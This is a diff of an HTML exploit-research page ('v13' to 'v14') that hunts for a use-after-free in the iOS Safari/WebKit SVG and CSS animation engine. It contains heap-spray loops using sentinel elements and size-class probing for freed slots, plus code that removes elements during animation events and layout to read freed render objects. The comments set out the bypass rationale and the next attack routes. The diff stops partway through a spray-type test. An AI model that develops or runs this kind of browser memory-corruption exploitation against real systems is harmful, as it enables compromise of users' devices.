@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG animate UAF v13 · immediate read + alt spray types</title>
+<title>SVG CSS render UAF v14 · render object lifetime + layout mid-remove</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -18,20 +18,19 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG animate UAF v13 · immediate read + standalone anim + alt spray · iOS 26.5.2</h2>
+<h2>SVG CSS render UAF v14 · CSS anim render obj + layout mid-remove + event target ref · iOS 26.5.2</h2>
 <div class="sub">
-  v12 FINDING: ST miss=32 raw=0 — when useEl removed first, getBBox=0 (slot zeroed by bmalloc)
-  80.0 was ALWAYS live useEl geometry, NOT freed sym1 memory
-  v13: read targetElement IMMEDIATELY after free (same microtask, before slot reuse)
-  Also: standalone animate (no useEl) + alt spray types (text/path/rect elements)
-  Goal: catch the window between free and reuse — read zeroed OR our spray bytes
+  v13 FINDING: SMIL animate.targetElement → ALWAYS returns useEl (JSC bridge sanitizes)
+  CSS animation event ref survives remove() — different lifetime than SMIL
+  v14: CSS animation render object UAF + layout-triggered stale ptr + getComputedStyle after remove
+  Goal: find a path that dereferences freed RenderObject* (not sanitized by JSC)
 </div>
 <div id="stage"><svg id="livesvg" width="200" height="200" viewBox="0 0 100 100"></svg></div>
 <div id="controls">
-  <button onclick="runIR()">IR immediate-read</button>
-  <button onclick="runSA()">SA standalone-anim</button>
-  <button onclick="runAT()">AT alt-spray-types</button>
-  <button onclick="runWR()">WR write-then-read</button>
+  <button onclick="runCS()">CS css-render</button>
+  <button onclick="runLY()">LY layout-remove</button>
+  <button onclick="runGC()">GC computed-style</button>
+  <button onclick="runFO()">FO foreignObject</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearLog()">CLR</button>
@@ -39,50 +38,75 @@ button:disabled{opacity:.3}
 <div id="log"></div>
 <script>
 /*
- * v12 CRITICAL FINDING:
- *   ST: useEl.remove() → sym1.remove() → spray → useEl.add() → getBBox = ALL ZERO
- *   80.0 was NOT freed memory — it was live useEl geometry
+ * v13 PIVOT RATIONALE:
+ *   SMIL animate.targetElement: ALWAYS returns useEl (JSC bridge sanitizes stale ptr)
+ *   The C++ SVGAnimateElement ptr reuse is real but JSC always identifies the live obj
+ *   We cannot bypass JSC bridge sanitization via targetElement getter
  *
- *   Proof:
- *   - When useEl in DOM: getBBox = useEl's live renderer geometry (80.0 when anim on sym2)
- *   - When useEl removed first: getBBox = 0 (no renderer, OR slot zeroed by bmalloc)
- *   - Either way: the UAF read we thought we had was actually just normal DOM behavior
+ *   WR T1 FINDING: CSS event ref survives remove()
+ *   capturedTarget.tagName=symbol AFTER sym1.remove()
+ *   This is a JS strong ref (expected) BUT exposes a different attack surface:
+ *   CSS animation → C++ CSSAnimationUpdate → RenderObject* — NOT through JSC bridge
  *
- * WHAT WE ACTUALLY HAVE:
- *   SVGAnimateElement.targetElement caches SVGElement* without clearing on remove()
- *   This IS a real UAF in the ptr caching layer
- *   The ptr gets reused immediately (JS is too slow to spray into the slot)
+ * v14 APPROACHES:
  *
- * v13 APPROACHES:
+ * CS (css-render):
+ *   Drive a CSS keyframe animation on sym1 (opacity, transform, etc.)
+ *   In rAF callback: remove sym1 while animation frame is in-flight
+ *   Check: does getComputedStyle on capturedTarget crash? Return stale data?
+ *   C++ path: CSSAnimationController → StyleResolver → RenderObject*
+ *   After remove(): RenderObject is destroyed, but CSSAnimationController
+ *   might still hold a ptr to it (no JSC bridge sanitization here)
  *
- * IR (immediate read):
- *   read targetElement IMMEDIATELY after sym1.remove() in the SAME synchronous block
- *   no rAF, no spray, no re-add
- *   if the slot hasn't been reused yet: reads zeroed bmalloc memory
- *   if there's ANY field that's non-zero before reuse: it's from the freed object
- *   try: targetElement.getBBox, targetElement.getScreenCTM, ALL before anything else
+ *   ALSO: animationiteration event — fires on EVERY loop
+ *   capture the event, remove the element INSIDE the event handler
+ *   then READ computed style inside same handler — C++ is still mid-dispatch
  *
- * SA (standalone animate):
- *   put the <animate> directly on sym1 (animating sym1's own attributes)
- *   no useEl needed — no useEl internal allocs competing for the freed slot
- *   sequence: anim on sym1 → sym1.remove() → spray → read targetElement
+ * LY (layout-remove):
+ *   Trigger a FORCED LAYOUT while sym1 is being removed
+ *   SVGSymbolElement participates in layout via its RenderSVGHiddenContainer
+ *   If we call getBBox() or offsetWidth on a SIBLING element while sym1.remove()
+ *   is mid-layout → layout may hold stale RenderObject ptrs
  *
- * AT (alt spray types):
- *   try different element types as spray to match sym1's bmalloc size class
- *   SVGTextElement, SVGPathElement, SVGCircleElement, SVGRectElement
- *   each has different C++ size — we're looking for the one that hits the freed slot
- *   metric: if targetElement returns our spray element's tagName = we know the size class
+ *   Pattern:
+ *     sym1 with CSS animation running (forces continuous layout)
+ *     in rAF: call sym1.remove() → IMMEDIATELY call sibling.getBBox()
+ *     the sibling's getBBox forces synchronous layout
+ *     layout traversal may access sym1's freed RenderObject
  *
- * WR (write-then-read):
- *   use CSS animation instead of SVG animate
- *   CSS animations store different state — might have a longer-lived stale ptr
- *   OR: try SMIL animate with fill="freeze" — frozen value might hold ptr differently
+ * GC (computed-style):
+ *   getComputedStyle on element AFTER remove() — does the style engine crash?
+ *   CSS animations update computed style on a timer
+ *   if the timer fires AFTER remove() but BEFORE the element is GC'd:
+ *     style engine accesses element's render data
+ *     element has no RenderObject (was destroyed on remove())
+ *     → null deref or stale ptr in style engine
  *
- * NEW SENTINEL STRATEGY:
- *   instead of geometry (float32 width), use element ID as sentinel
- *   spray elements with distinctive IDs: "SENTINEL_0xDEAD_..."
- *   after free: check targetElement.id — if it contains "SENTINEL": spray landed
- *   this works regardless of geometry/size class
+ *   Pattern:
+ *     CSS anim on sym1 (fast: 0.01s)
+ *     remove sym1
+ *     IMMEDIATELY call getComputedStyle(sym1) in tight loop
+ *     look for crash or stale values
+ *
+ * FO (foreignObject):
+ *   Put sym1 inside <foreignObject> inside the SVG
+ *   foreignObject creates a mixed SVG/HTML layout boundary
+ *   SVGSymbolElement inside foreignObject is unusual (spec-undefined behavior)
+ *   animating sym1 inside foreignObject may expose a different C++ ptr path
+ *   remove sym1 while foreignObject is being rendered
+ *   also: use CSS animation on the foreignObject itself while sym1 is inside
+ *
+ * CRASH DETECTION:
+ *   window.onerror catches JS-level crashes
+ *   But C++ heap corruption may crash without a catchable JS error
+ *   We log each step — if the log stops mid-test: crash at that step
+ *   We also use a heartbeat (setTimeout 0 after each risky call) — if it doesn't fire: crash
+ *
+ * STALE DATA DETECTION:
+ *   Before remove: record baseline values (opacity, transform matrix, computed style)
+ *   After remove: call getComputedStyle on capturedRef
+ *   If values are non-zero/non-default: stale render data being read
+ *   If values are different from baseline in unexpected ways: UAF read
  */
 
 const SVG_NS='http://www.w3.org/2000/svg';
@@ -91,554 +115,461 @@ const livesvg=document.getElementById('livesvg');
 function log(m,c){const s=document.createElement('span');if(c)s.className=c;s.textContent=m+'\n';Lel.appendChild(s);Lel.scrollTop=Lel.scrollHeight;}
 const sep=()=>log('─'.repeat(52),'sep');
 const raf=()=>new Promise(r=>requestAnimationFrame(r));
+const tick=()=>new Promise(r=>setTimeout(r,0));
 function copyLog(){try{navigator.clipboard.writeText(Lel.innerText);}catch(e){const a=document.createElement('textarea');a.value=Lel.innerText;document.body.appendChild(a);a.select();document.execCommand('copy');a.remove();}}
 function clearLog(){Lel.innerHTML='';}
 function dis(d){document.querySelectorAll('button').forEach(b=>{if(!b.onclick?.toString().match(/copy|clear/i))b.disabled=d;});}
-window.onerror=(m,_,l,c)=>{log(`[CRASH] ${m} L${l}:${c}`,'bad');return false;};
+window.onerror=(m,_,l,c,err)=>{log(`[CRASH] ${m} L${l}:${c}`,'bad');return false;};
+window.onunhandledrejection=e=>{log(`[UNHANDLED] ${e.reason}`,'bad');};
 
 function f2h(f){const b=new ArrayBuffer(4);new Float32Array(b)[0]=f;return'0x'+new Uint32Array(b)[0].toString(16).padStart(8,'0');}
-function d2h(d){const b=new ArrayBuffer(8);new Float64Array(b)[0]=d;const u=new Uint32Array(b);
-    return'0x'+u[1].toString(16).padStart(8,'0')+'_'+u[0].toString(16).padStart(8,'0');}
-function f2u(f){const b=new ArrayBuffer(4);new Float32Array(b)[0]=f;return new Uint32Array(b)[0];}
 
-let spraySvg=null;
-function getSpraySvg(){
-    if(!spraySvg){
-        spraySvg=document.createElementNS(SVG_NS,'svg');
-        spraySvg.setAttribute('width','1');spraySvg.setAttribute('height','1');
-        spraySvg.style.cssText='position:fixed;top:-2px;left:-2px;opacity:1;width:1px;height:1px';
-        document.body.appendChild(spraySvg);
-    }
-    return spraySvg;
+let styleEl=null;
+function injectStyle(css){
+    if(styleEl)styleEl.remove();
+    styleEl=document.createElement('style');
+    styleEl.textContent=css;
+    document.head.appendChild(styleEl);
 }
-function clearSpray(){if(spraySvg)spraySvg.innerHTML='';}
+function clearStyle(){if(styleEl){styleEl.remove();styleEl=null;}}
 
-function mkSym1(id){
-    const sym=document.createElementNS(SVG_NS,'symbol');
-    sym.setAttribute('id',id);sym.setAttribute('viewBox','0 0 100 100');
-    for(let i=0;i<4;i++){
-        const r=document.createElementNS(SVG_NS,'rect');
-        r.setAttribute('x',String(i*20));r.setAttribute('y','10');
-        r.setAttribute('width','15');r.setAttribute('height','15');
-        sym.appendChild(r);
-    }
-    return sym;
-}
-function mkSym2(id){
+function mkSym(id,w,h){
     const sym=document.createElementNS(SVG_NS,'symbol');
     sym.setAttribute('id',id);sym.setAttribute('viewBox','0 0 100 100');
     const r=document.createElementNS(SVG_NS,'rect');
-    r.setAttribute('x','10');r.setAttribute('y','10');r.setAttribute('width','80');r.setAttribute('height','80');
+    r.setAttribute('x','10');r.setAttribute('y','10');
+    r.setAttribute('width',String(w||80));r.setAttribute('height',String(h||80));
     sym.appendChild(r);
     return sym;
 }
 
-async function setup(id){
-    while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-    clearSpray();
-    await raf();await raf();
-    const sym1=mkSym1(`${id}_s1`);
-    const sym2=mkSym2(`${id}_s2`);
-    livesvg.appendChild(sym1);livesvg.appendChild(sym2);
-    const useEl=document.createElementNS(SVG_NS,'use');
-    useEl.setAttribute('href',`#${id}_s1`);
-    const anim=document.createElementNS(SVG_NS,'animate');
-    anim.setAttribute('attributeName','href');
-    anim.setAttribute('values',`#${id}_s1;#${id}_s2`);
-    anim.setAttribute('dur','0.1s');
-    anim.setAttribute('repeatCount','indefinite');
-    useEl.appendChild(anim);
-    livesvg.appendChild(useEl);
-    let cached=false,bbPre=null,attempts=0;
-    while(!cached&&attempts<20){
-        await raf();attempts++;
-        try{const bb=useEl.getBBox();if(bb.width>10){cached=true;bbPre=bb;}}catch(e){}
-    }
-    return{useEl,anim,sym1,sym2,cached,bbPre};
-}
-async function teardown(){
-    clearSpray();
-    while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-    await raf();await raf();
-}
-
-// ── IR: immediate read — read targetElement in SAME microtask as free ─────
-// Theory: between sym1.remove() and the next microtask checkpoint,
-//         the C++ slot may not be reused yet
-//         reading targetElement immediately might give us:
-//           (a) zeroed slot — bmalloc zeroes on free
-//           (b) our sentinel — if spray somehow runs sync
-//           (c) partially freed data — refcount fields, vtable, etc
-// Also testing: reading BEFORE free (baseline) vs IMMEDIATELY after free
-async function runIR(q=false){
-    if(!q){dis(true);sep();log('▶ IR: immediate read — targetElement in same microtask as free','inf');sep();}
-    log('[*] reading anim.targetElement immediately after sym1.remove()','inf');
-    log('[*] no spray, no rAF, no re-add between free and read','ok');
-    log('[*] looking for: non-null tgt, tagName, id, getBBox before slot reused','ok');
+// ── CS: CSS animation render object UAF ──────────────────────────────────
+// CSS animations drive style updates through C++ (not through JSC bridge)
+// animationiteration event fires WHILE the animation C++ state is live
+// remove element INSIDE event handler → C++ style engine still mid-dispatch
+// read computed style after remove → does it crash or return stale data?
+async function runCS(q=false){
+    if(!q){dis(true);sep();log('▶ CS: CSS animation render UAF — remove inside event handler','inf');sep();}
+    log('[*] CSS keyframe on sym1 → remove() inside animationiteration handler','inf');
+    log('[*] read getComputedStyle inside same handler (C++ still mid-dispatch)','ok');
+    log('[*] baseline vs post-remove computed values — looking for stale data or crash','ok');
     log('');
 
-    let nullCount=0,liveCount=0,crashCount=0;
-    const tagFreq={};
-    const idFreq={};
-    const wFreq={};
+    let staleCount=0,defaultCount=0,crashCount=0,eventsFired=0;
+    const staleValues=[];
 
-    for(let t=0;t<32;t++){
-        const{useEl,anim,sym1,sym2,cached}=await setup(`ir_${t}`);
-        if(!cached){await teardown();continue;}
-
-        // BASELINE: read targetElement BEFORE free
-        let preTgt=null,preTag='?',preId='?',preBB=null;
-        try{
-            preTgt=anim.targetElement;
-            if(preTgt){preTag=preTgt.tagName;preId=preTgt.id;}
-        }catch(e){}
-        try{if(preTgt)preBB=preTgt.getBBox();}catch(e){}
-
-        // FREE sym1 — DO NOT do anything between this and the next read
-        sym1.remove();
-
-        // IMMEDIATELY read targetElement — same synchronous block, NO await
-        let postTgt=null,postTag='?',postId='?',postBB=null;
-        let tgtCrash=null;
-        try{postTgt=anim.targetElement;}catch(e){tgtCrash=String(e);crashCount++;}
-
-        if(postTgt===null||postTgt===undefined){
-            nullCount++;
-        }else{
-            liveCount++;
-            try{postTag=postTgt.tagName;}catch(e){postTag='[crash]';}
-            try{postId=postTgt.id;}catch(e){postId='[crash]';}
-            try{postBB=postTgt.getBBox();}catch(e){}
-
-            tagFreq[postTag]=(tagFreq[postTag]||0)+1;
-            idFreq[postId]=(idFreq[postId]||0)+1;
-
-            const w=postBB?postBB.width:null;
-            const wh=w!==null?f2h(w):'null';
-            wFreq[wh]=(wFreq[wh]||0)+1;
-
-            // Log the first few and any unexpected
-            const isExpected=(postTag==='use'||postTag==='symbol');
-            if(t<4||!isExpected){
-                log(`  t${t}: pre tag=${preTag} id=${preId}`,'dim');
-                log(`  t${t}: post tag=${postTag} id=${postId}`,(postTag!==preTag?'bad':'hi'));
-                if(postBB)log(`  t${t}: getBBox w=${postBB.width.toFixed(4)} h=${postBB.height.toFixed(4)}`,'hi');
-                if(postId&&postId.includes('SENTINEL'))log(`  t${t}: [SENTINEL ID FOUND!]`,'bad');
-            }
-        }
-
-        await teardown();
-    }
-
-    log(`\n[*] IR: null=${nullCount} live=${liveCount} crash=${crashCount}`,'inf');
-    log(`[*] tagFreq: ${Object.entries(tagFreq).map(([k,v])=>`${k}×${v}`).join(' ')}`,'hi');
-    log(`[*] wFreq: ${Object.entries(wFreq).sort((a,b)=>b[1]-a[1]).slice(0,6).map(([h,c])=>`${h}×${c}`).join(' ')}`,'dim');
-
-    if(!q)dis(false);
-    return{nullCount,liveCount,tagFreq,wFreq};
-}
-
-// ── SA: standalone animate — no useEl ────────────────────────────────────
-// Put the <animate> on sym1 itself or on sym2
-// Animate sym1's OWN attribute (e.g. viewBox between two values)
-// targetElement = sym1 directly
-// After sym1.remove(): targetElement stale ptr to sym1
-// Spray immediately — no useEl to compete for freed slot
-// Read targetElement → if it returns a spray object: spray hit!
-async function runSA(q=false){
-    if(!q){dis(true);sep();log('▶ SA: standalone animate — anim directly on sym1, no useEl','inf');sep();}
-    log('[*] animate sym1.viewBox directly — no useEl, no useEl internal allocs','inf');
-    log('[*] after sym1.remove(): spray immediately, no competition','ok');
-    log('[*] read anim.targetElement → if tagName=SENTINEL: spray landed!','ok');
-    log('');
-
-    const SPRAY_COUNT=1024;
-    let hit=0,miss=0,raw=0,crash=0;
-    const tagFreq={};
-
-    for(let t=0;t<24;t++){
-        // Build: sym1 with animate ON it (no useEl)
+    for(let t=0;t<20;t++){
         while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-        clearSpray();
+        clearStyle();
         await raf();await raf();
 
-        const sym1=mkSym1(`sa_${t}_s1`);
-        const sym2=mkSym2(`sa_${t}_s2`);
+        const sym1=mkSym(`cs_${t}`,80,80);
+        sym1.setAttribute('class',`cs_anim_${t}`);
+        // Put sym1 visibly in livesvg so CSS animation fires
+        livesvg.appendChild(sym1);
 
-        // Animate sym1's viewBox between two values (any animatable attr works)
-        // We need the animation to be running so targetElement ptr is cached
-        const anim=document.createElementNS(SVG_NS,'animate');
-        anim.setAttribute('attributeName','viewBox');
-        anim.setAttribute('values','0 0 100 100;0 0 200 200');
-        anim.setAttribute('dur','0.1s');
-        anim.setAttribute('repeatCount','indefinite');
-        sym1.appendChild(anim);
+        // CSS animation: fast loop, animating opacity
+        // opacity is a cheap property — style engine reads from render obj
+        injectStyle(`
+            @keyframes cs_pulse_${t} {
+                0%   { opacity: 1.0; }
+                25%  { opacity: 0.5; }
+                50%  { opacity: 0.1; }
+                75%  { opacity: 0.5; }
+                100% { opacity: 1.0; }
+            }
+            .cs_anim_${t} {
+                animation: cs_pulse_${t} 0.05s linear infinite;
+            }
+        `);
+
+        // Get baseline computed style BEFORE anything
+        let baseOpacity='?',baseDisplay='?';
+        try{
+            const cs=getComputedStyle(sym1);
+            baseOpacity=cs.opacity;
+            baseDisplay=cs.display;
+        }catch(e){}
+
+        // Capture element ref for use in event handler
+        const capturedSym=sym1;
+        let handled=false;
+        let postOpacity='?',postDisplay='?',postTagName='?',postId='?';
+        let handlerCrashed=false;
+
+        await new Promise(resolve=>{
+            let timeoutId=setTimeout(()=>{
+                // No animation event fired — element might not be animating
+                log(`  t${t}: no animationiteration fired within timeout`,'dim');
+                resolve();
+            },500);
+
+            sym1.addEventListener('animationiteration',function handler(e){
+                if(handled){return;}
+                handled=true;
+                clearTimeout(timeoutId);
+                eventsFired++;
+
+                // ① Record the target ref from the event
+                const evTarget=e.target;
+
+                // ② REMOVE the element while we're inside the event handler
+                //    C++ is still in the middle of dispatching this event
+                //    StyleEngine/AnimationController holds ptrs to sym1's render obj
+                try{capturedSym.remove();}catch(ex){log(`  t${t}: remove() threw: ${ex}`,'bad');}
+
+                // ③ Immediately read computed style — C++ may deref freed render obj
+                try{
+                    const cs=getComputedStyle(capturedSym);
+                    postOpacity=cs.opacity;
+                    postDisplay=cs.display;
+                }catch(ex){handlerCrashed=true;crashCount++;postOpacity='[crash]';}
+
+                // ④ Read from the event target directly
+                try{postTagName=evTarget.tagName;}catch(ex){postTagName='[crash]';crashCount++;}
+                try{postId=evTarget.id;}catch(ex){postId='[crash]';crashCount++;}
+
+                // ⑤ Try getBBox on the removed element
+                let postBBox='?';
+                try{postBBox=JSON.stringify(capturedSym.getBBox());}catch(ex){postBBox='[crash:'+ex.message+']';}
+
+                // Check for stale data
+                const opacityF=parseFloat(postOpacity);
+                const isStale=!isNaN(opacityF)&&opacityF>0&&opacityF<1.0&&postOpacity!==baseOpacity;
+                const isMidAnim=!isNaN(opacityF)&&opacityF!==0&&opacityF!==1;
+
+                if(isMidAnim||isStale){
+                    staleCount++;
+                    staleValues.push({t,base:baseOpacity,post:postOpacity,tag:postTagName});
+                    log(`  t${t}: [STALE?] base_opacity=${baseOpacity} post_opacity=${postOpacity}`,'bad');
+                    log(`          tag=${postTagName} id=${postId} bbox=${postBBox}`,'bad');
+                }else{
+                    defaultCount++;
+                    if(t<3)log(`  t${t}: base=${baseOpacity} post=${postOpacity} tag=${postTagName} bbox=${postBBox}`,'dim');
+                }
+
+                resolve();
+            },{once:false}); // not once — fire on EVERY iteration, resolve on first
+        });
+
+        clearStyle();
+        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+        await raf();
+    }
+
+    log(`\n[*] CS: eventsFired=${eventsFired} stale=${staleCount} default=${defaultCount} crash=${crashCount}`,(staleCount>0?'bad':'inf'));
+    if(staleCount>0){
+        log(`[+] STALE DATA READ — computed style returned mid-animation values after remove()!`,'bad');
+        for(const v of staleValues)log(`    t${v.t}: ${v.base} → ${v.post} tag=${v.tag}`,'bad');
+    }else if(crashCount>0){
+        log(`[+] CRASH during CSS animation event handler — C++ UAF likely!`,'bad');
+    }else{
+        log(`[*] no stale data — style engine clears render obj ptr on remove() synchronously`,'inf');
+    }
+
+    if(!q)dis(false);
+    return{eventsFired,staleCount,defaultCount,crashCount};
+}
+
+// ── LY: layout-triggered stale RenderObject ptr ──────────────────────────
+// SVGSymbolElement has a RenderSVGHiddenContainer
+// getBBox() on ANY element in the same SVG triggers synchronous layout
+// if we remove sym1 AND immediately call getBBox on a sibling:
+//   layout runs, may access sym1's freed RenderObject if layout list wasn't cleared
+// also: try calling getBBox on sym1 ITSELF after remove() (direct freed obj access)
+async function runLY(q=false){
+    if(!q){dis(true);sep();log('▶ LY: layout mid-remove — getBBox on sibling during sym1.remove()','inf');sep();}
+    log('[*] sym1.remove() → IMMEDIATELY getBBox(sibling) in same sync block','inf');
+    log('[*] also: getBBox(sym1) after remove — direct freed RenderObject access','ok');
+    log('[*] CSS anim on sibling to keep layout dirty → makes stale ptr more likely','ok');
+    log('');
+
+    let crashCount=0,staleCount=0,normalCount=0;
+    const bboxValues=[];
+
+    injectStyle(`
+        @keyframes ly_spin {
+            0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}
+        }
+        .ly_spin { animation: ly_spin 0.1s linear infinite; }
+    `);
+
+    for(let t=0;t<24;t++){
+        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+        await raf();await raf();
+
+        const sym1=mkSym(`ly_${t}_s1`,80,80);
+        const sym2=mkSym(`ly_${t}_s2`,40,40); // sibling
+
+        // useEl for sym1 — keeps it in layout
+        const useEl=document.createElementNS(SVG_NS,'use');
+        useEl.setAttribute('href',`#ly_${t}_s1`);
+        useEl.setAttribute('class','ly_spin'); // CSS anim keeps layout dirty
 
         livesvg.appendChild(sym1);
         livesvg.appendChild(sym2);
+        livesvg.appendChild(useEl);
 
-        // Wait for animation to cache targetElement ptr
-        let cached=false,attempts=0;
-        while(!cached&&attempts<20){
-            await raf();attempts++;
-            try{
-                const tgt=anim.targetElement;
-                if(tgt&&tgt.tagName==='symbol'){cached=true;}
-            }catch(e){}
+        await raf();await raf(); // let layout settle + animation start
+
+        // BASELINE
+        let baseW=0;
+        try{baseW=useEl.getBBox().width;}catch(e){}
+
+        // ── PHASE 1: sym1.remove() then IMMEDIATELY getBBox(useEl) same sync block
+        let p1W=null,p1Crash=null;
+        sym1.remove();
+        try{p1W=useEl.getBBox().width;}catch(ex){p1Crash=String(ex);crashCount++;}
+
+        // ── PHASE 2: getBBox on sym1 itself after remove
+        let p2W=null,p2H=null,p2Crash=null;
+        try{const bb=sym1.getBBox();p2W=bb.width;p2H=bb.height;}catch(ex){p2Crash=String(ex);crashCount++;}
+
+        // ── PHASE 3: getComputedStyle on sym1 after remove
+        let p3Op=null,p3Crash=null;
+        try{p3Op=getComputedStyle(sym1).opacity;}catch(ex){p3Crash=String(ex);crashCount++;}
+
+        // ── PHASE 4: force layout again after free, check sibling's bbox
+        let p4W=null,p4Crash=null;
+        try{p4W=sym2.getBBox().width;}catch(ex){p4Crash=String(ex);crashCount++;}
+
+        // Analyze
+        const interesting=(p1W!==null&&p1W!==baseW&&p1W!==0)
+                        ||(p2W!==null&&p2W!==0)
+                        ||(p2Crash&&p2Crash.includes('crash'))
+                        ||(p1Crash!==null);
+
+        if(interesting){
+            staleCount++;
+            log(`  t${t}: [INTERESTING!] base=${baseW} p1=${p1W??p1Crash} p2=${p2W??p2Crash} p3=${p3Op??p3Crash} p4=${p4W??p4Crash}`,'bad');
+        }else{
+            normalCount++;
+            if(t<4)log(`  t${t}: base=${baseW} p1=${p1W} p2=${p2W} p3=${p3Op} p4=${p4W}`,'dim');
         }
-        if(!cached){await teardown();continue;}
 
-        // Baseline: check targetElement before free
-        let preTgt=null;
-        try{preTgt=anim.targetElement;}catch(e){}
+        bboxValues.push({t,baseW,p1W,p2W,p2Crash,p1Crash});
 
-        // SPRAY first (before free) — try to fill up size class
-        const ss=getSpraySvg();
-        // Spray with sentinel symbols
-        for(let i=0;i<SPRAY_COUNT;i++){
-            const sp=document.createElementNS(SVG_NS,'symbol');
-            sp.setAttribute('id',`SENTINEL_${t}_${i}`);
-            sp.setAttribute('viewBox','0 0 100 100');
-            const r=document.createElementNS(SVG_NS,'rect');
-            r.setAttribute('width','999');r.setAttribute('height','999');
-            sp.appendChild(r);
-            ss.appendChild(sp);
-        }
+        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+        await raf();
+    }
 
-        // FREE sym1 — now with no useEl competing for the slot
+    clearStyle();
+    log(`\n[*] LY: stale=${staleCount} normal=${normalCount} crash=${crashCount}`,(staleCount>0||crashCount>0?'bad':'inf'));
+    if(p2Values_nonzero(bboxValues)){
+        log(`[+] getBBox(sym1_after_remove) returned non-zero: freed RenderObject accessed!`,'bad');
+    }
+
+    if(!q)dis(false);
+    return{staleCount,normalCount,crashCount};
+}
+function p2Values_nonzero(arr){return arr.some(v=>v.p2W!==null&&v.p2W!==0);}
+
+// ── GC: getComputedStyle tight loop after remove ─────────────────────────
+// Fire getComputedStyle on sym1 in a tight loop after remove()
+// CSS animation timer may fire mid-loop → style engine accesses freed render obj
+// looking for: stale values, unexpected values, or crash
+async function runGC(q=false){
+    if(!q){dis(true);sep();log('▶ GC: getComputedStyle tight loop after remove()','inf');sep();}
+    log('[*] CSS anim on sym1 → sym1.remove() → tight getComputedStyle loop','inf');
+    log('[*] looking for: stale opacity values, crash, or unexpected computed values','ok');
+    log('');
+
+    let hitCount=0,missCount=0,crashCount=0;
+    const hitValues=[];
+
+    for(let t=0;t<16;t++){
+        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+        clearStyle();
+        await raf();await raf();
+
+        const sym1=mkSym(`gc_${t}`,80,80);
+        livesvg.appendChild(sym1);
+
+        injectStyle(`
+            @keyframes gc_fade_${t} {
+                0%{opacity:1}50%{opacity:0.01}100%{opacity:1}
+            }
+            #gc_${t} { animation: gc_fade_${t} 0.02s linear infinite; }
+        `);
+
+        await raf(); // let animation start
+
+        // Baseline
+        let baseOp='?';
+        try{baseOp=getComputedStyle(sym1).opacity;}catch(e){}
+
+        // Remove sym1
         sym1.remove();
 
-        // Spray MORE after free
-        for(let i=SPRAY_COUNT;i<SPRAY_COUNT*2;i++){
-            const sp=document.createElementNS(SVG_NS,'symbol');
-            sp.setAttribute('id',`SENTINEL_${t}_${i}`);
-            sp.setAttribute('viewBox','0 0 100 100');
-            const r=document.createElementNS(SVG_NS,'rect');
-            r.setAttribute('width','999');r.setAttribute('height','999');
-            sp.appendChild(r);
-            ss.appendChild(sp);
-        }
-
-        await raf();
-
-        // Read targetElement — did spray land?
-        let postTgt=null,postTag='?',postId='?';
-        try{postTgt=anim.targetElement;}catch(e){crash++;await teardown();continue;}
-
-        if(!postTgt){miss++;await teardown();continue;}
-
-        try{postTag=postTgt.tagName;}catch(e){postTag='[crash]';crash++;}
-        try{postId=postTgt.id;}catch(e){postId='[crash]';}
-
-        tagFreq[postTag]=(tagFreq[postTag]||0)+1;
-
-        if(postId.includes('SENTINEL')){
-            hit++;
-            log(`  t${t}: [SPRAY HIT!] tagName=${postTag} id=${postId}`,'bad');
-        }else if(postTag==='symbol'&&!postId.includes('sa_')){
-            raw++;
-            log(`  t${t}: unexpected symbol id=${postId} ← wrong sym grabbed`,'hi');
-        }else{
-            if(t<4)log(`  t${t}: tgt=${postTag} id=${postId}`,'dim');
-        }
-
-        await teardown();
-    }
-
-    log(`\n[*] SA: hit=${hit} miss=${miss} raw=${raw} crash=${crash}`,(hit>0?'bad':'inf'));
-    log(`[*] tagFreq: ${Object.entries(tagFreq).map(([k,v])=>`${k}×${v}`).join(' ')}`,'hi');
-    if(hit>0)log(`[+] SPRAY HIT via standalone animate! targetElement returned our sentinel`,'bad');
-    else log(`[*] no hit — spray still not landing in freed sym1 slot`,'inf');
-
-    if(!q)dis(false);
-    return{hit,miss,raw,crash,tagFreq};
-}
-
-// ── AT: alt spray types — match sym1's exact bmalloc size class ───────────
-// SVGSymbolElement might not be 384B — we've been guessing
-// Try spraying different element types and checking which one targetElement returns
-// If targetElement returns a non-sym1 element type: we know that type's size matches sym1
-// This tells us the EXACT size class to spray for controlled UAF
-async function runAT(q=false){
-    if(!q){dis(true);sep();log('▶ AT: alt spray types — find which element matches sym1 size class','inf');sep();}
-    log('[*] spray different SVG element types after sym1.remove()','inf');
-    log('[*] if targetElement.tagName changes to spray type: size class match!','ok');
-    log('[*] types: circle, rect, text, line, ellipse, path, use, image','ok');
-    log('');
-
-    // Each spray type: spray 2000 of that type, check targetElement.tagName
-    const SPRAY_COUNT=2000;
-    const types=[
-        ['circle',()=>{const e=document.createElementNS(SVG_NS,'circle');e.setAttribute('r','50');e.setAttribute('cx','50');e.setAttribute('cy','50');return e;}],
-        ['rect',()=>{const e=document.createElementNS(SVG_NS,'rect');e.setAttribute('width','100');e.setAttribute('height','100');return e;}],
-        ['text',()=>{const e=document.createElementNS(SVG_NS,'text');e.textContent='SENTINEL';return e;}],
-        ['line',()=>{const e=document.createElementNS(SVG_NS,'line');e.setAttribute('x1','0');e.setAttribute('y1','0');e.setAttribute('x2','100');e.setAttribute('y2','100');return e;}],
-        ['ellipse',()=>{const e=document.createElementNS(SVG_NS,'ellipse');e.setAttribute('rx','50');e.setAttribute('ry','30');return e;}],
-        ['path',()=>{const e=document.createElementNS(SVG_NS,'path');e.setAttribute('d','M 0 0 L 100 100 Z');return e;}],
-        ['g',()=>{const e=document.createElementNS(SVG_NS,'g');return e;}],
-        ['defs',()=>{const e=document.createElementNS(SVG_NS,'defs');return e;}],
-    ];
-
-    const results={};
-
-    for(const[typeName,mkEl]of types){
-        let hitCount=0,symCount=0,otherCount=0,crashCount=0;
